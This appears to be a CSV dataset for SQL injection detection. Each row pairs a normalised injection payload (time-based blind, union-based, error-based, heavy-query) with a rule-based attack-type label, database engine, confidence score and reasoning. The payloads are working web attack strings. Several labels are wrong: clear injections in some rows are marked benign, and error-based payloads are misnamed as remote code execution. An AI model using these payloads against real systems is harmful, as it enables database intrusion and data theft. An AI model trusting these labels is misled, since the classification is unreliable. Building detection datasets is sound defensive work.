row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
5202,-6843' or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'eeff' = 'eeff,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5203,1'+ ( select gkve where 1943 = 1943 waitfor delay '0:0:5' ) +',1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5204,"1'|| ( select 'wgte' from dual where 6316 = 6316 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'",1,,rce,oracle,0.95,0x7171706a71 detected — rce injection (priority 1) on oracle,rule-based
5205,"1 where 1326 = 1326 union all select null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5206,1 where 7299 = 7299 rlike sleep ( 5 ) --,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5207,"-2889 ) ) as iqzv where 1786 = 1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5208,"1 where 7932 = 7932 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
5209,"1',updatexml ( 2917,concat ( 0x2e,0x7171706a71, ( select ( elt ( 2917 = 2917,1 ) ) ) ,0x717a767a71 ) ,8295 )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
5210,1 where 7802 = 7802,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5211,1'+ ( select 'ohdf' where 7878 = 7878 and 5678 = 3277--,1,,boolean_blind,generic,0.95,7878 = 7878 and detected — boolean_blind injection (priority 8) on generic,rule-based
5212,1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( 'svwr' = 'svwr,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5213,"1"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""hiwo"" like ""hiwo",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
5214,1'+ ( select iowv where 6105 = 6105 and sleep ( 5 ) #,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
5215,"1 where 6369 = 6369 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
5216,1 ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ),1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5217,"1"" ) as pgza where 8756 = 8756 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
5218,-9331' or ( 4519 = 2912 ) *2912 and 'rddk' = 'rddk,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5219,"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and 'sloy' = 'sloy",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
